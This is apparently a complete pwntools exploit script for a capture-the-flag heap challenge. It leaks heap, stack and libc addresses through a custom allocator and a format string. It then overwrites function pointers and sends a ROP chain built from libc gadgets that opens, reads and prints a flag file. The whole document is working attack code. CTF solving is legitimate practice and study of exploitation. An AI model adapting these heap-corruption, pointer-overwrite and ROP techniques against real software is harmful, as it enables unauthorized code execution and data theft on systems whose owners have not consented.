from pwn import *
import warnings

warnings.simplefilter("ignore", category=BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")

p = elf.process()
# p = remote("127.0.0.1", 12345)	# may not work with current offsets; use exploit.py
# p = remote("chall.polygl0ts.ch", 9004)

# gdb.attach(p)
# pause()

p.sendlineafter("SIZE > ", b"4000")
p.sendlineafter("> ", b"2")

def malloc(idx, size, content):
	p.sendlineafter("> ", b"1")
	p.sendlineafter("index > ", str(idx))
	p.sendlineafter("size > ", str(size))
	p.sendlineafter("content > ", content)

def free(idx):
	p.sendlineafter("> ", b"3")
	p.sendlineafter("index > ", str(idx))

def show(idx):
	p.sendlineafter("> ", b"2")
	p.sendlineafter("index > ", str(idx))
	p.recvuntil("content : ")
	return p.recvuntil("1 - create")[:-11]

malloc(0, 0x3000, b"HUGE")
free(0)

malloc(0, 0x20, b"TINY1")
malloc(1, 0x20, b"TINY2")
malloc(2, 0x2000 - 0x40 + 0x20, b"A" * (0x2000 - 0x40))
free(1)
free(0)
data_heap = u64(show(2)[-6:].ljust(8, b"\0")) - 0x2040
log.success("data_heap = " + hex(data_heap))
free(2)

extend_mapping_got = data_heap + 0xd088
backward_consolidate = data_heap + 0xaa85
printf_plt = data_heap + 0xa1c0

malloc(2, 0x2000 - 0x40 + 0x20, b"A" * (0x2000 - 0x40) + p64(extend_mapping_got + 0x2000))
malloc(0, 0x20, b"TINY3")
malloc(1, 0x20, p64(printf_plt) + p64(backward_consolidate))
free(2)
malloc(2, 0x2000 - 0x40 + 0x20, b"A" * (0x2000 - 0x40) + b"|%13$p|%14$p|%15$p|%23$p|END")
free(2)
# malloc(0, 0x4000, b"HUGE2")
p.sendlineafter("> ", b"1")
p.sendlineafter("index > ", b"0")
p.sendlineafter("size > ", str(0x4000))
p.recvuntil(b"|")
fmt_leak = p.recvuntil(b"|END")[:-4]
log.success("fmt_leak = " + repr(fmt_leak))
p.sendlineafter("content > ", b"HUGE2")
free(0)

fmt_leak = list(map(lambda x: int(x, 16), fmt_leak.split(b"|")))
stack_leak = fmt_leak[1]
log.success("stack_leak = " + hex(stack_leak))
libc.address = fmt_leak[3] - 0x29d90
log.success("libc_base = " + hex(libc.address))

get_free_chunk_got = data_heap + 0xd040

malloc(0, 0x40, b"TINY4")
malloc(1, 0x40, b"TINY5")
free(1)
free(0)
malloc(2, 0x2000, b"B" * (0x2000 - 0x80) + p64(get_free_chunk_got + 0x2000))
malloc(0, 0x40, b"TINY6")
malloc(1, 0x40, p64(libc.sym["gets"]) + p64(libc.sym["printf"]))

# gadgets in libc
# 0x0000000000029cd6 : ret
# 0x000000000002a3e5 : pop rdi ; ret
# 0x000000000002be51 : pop rsi ; ret
# 0x0000000000090529 : pop rdx ; pop rbx ; ret
# 0x0000000000141e21 : mov qword ptr [rsi], rdi ; ret

ret = libc.address + 0x0000000000029cd6
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbx = libc.address + 0x0000000000090529
store_rsi_rdi = libc.address + 0x0000000000141e21

rop = p64(ret) * 8
rop += p64(pop_rdi) + b"flag\0".ljust(8, b"\0")
rop += p64(pop_rsi) + p64(data_heap)
rop += p64(store_rsi_rdi)
rop += p64(pop_rdi) + p64(data_heap)
rop += p64(pop_rsi) + p64(0)
rop += p64(libc.sym["open"])
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(data_heap)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(libc.sym["read"])
rop += p64(pop_rdi) + p64(1)
rop += p64(pop_rsi) + p64(data_heap)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(libc.sym["write"])

# send ROP payload
p.sendlineafter("> ", b"1")
p.sendlineafter("index > ", b"1")
rop_start = stack_leak - 0x20
if (rop_start % 0x20):
	rop_start -= rop_start % 0x20
p.sendlineafter("size > ", str(rop_start))
p.sendline(rop)

p.interactive()
